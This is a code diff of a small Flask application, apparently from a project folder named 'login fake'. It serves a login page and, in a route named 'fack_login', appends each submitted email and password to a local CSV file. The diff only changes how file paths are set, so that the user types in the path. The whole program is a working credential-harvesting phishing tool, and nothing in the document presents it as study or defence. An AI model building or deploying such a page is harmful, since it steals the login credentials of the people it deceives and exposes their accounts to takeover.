@@ -1,12 +1,13 @@
 from flask import Flask , render_template ,  request
-
-with open("Email+Password.csv",mode='w') as f :
+app = Flask(__name__)
+path=input("Your Path : Follow Format this <Your Path To>/login fake/ ")
+with open(path+"Email+Password.csv",mode='w') as f :
     f.write("""Email , Password""")
     f.close()
 
-app = Flask(__name__)
-app.static_folder="<Your Path>/login fake/File"
-app.template_folder="<Your Path>/login fake/File"
+
+app.static_folder=path+"file"
+app.template_folder=path+"file"
 @app.route("/") 
 def index():
  return render_template("index.html")
@@ -15,7 +16,7 @@ def index():
 def fack_login() :
   e=request.args.get("email")
   p=request.args.get("password")
-  with open("Email+Password.csv",mode='a') as f :
+  with open(path+"Email+Password.csv",mode='a') as f :
     f.write("""
     {0} , {1} """.format(e,p))
     f.close()
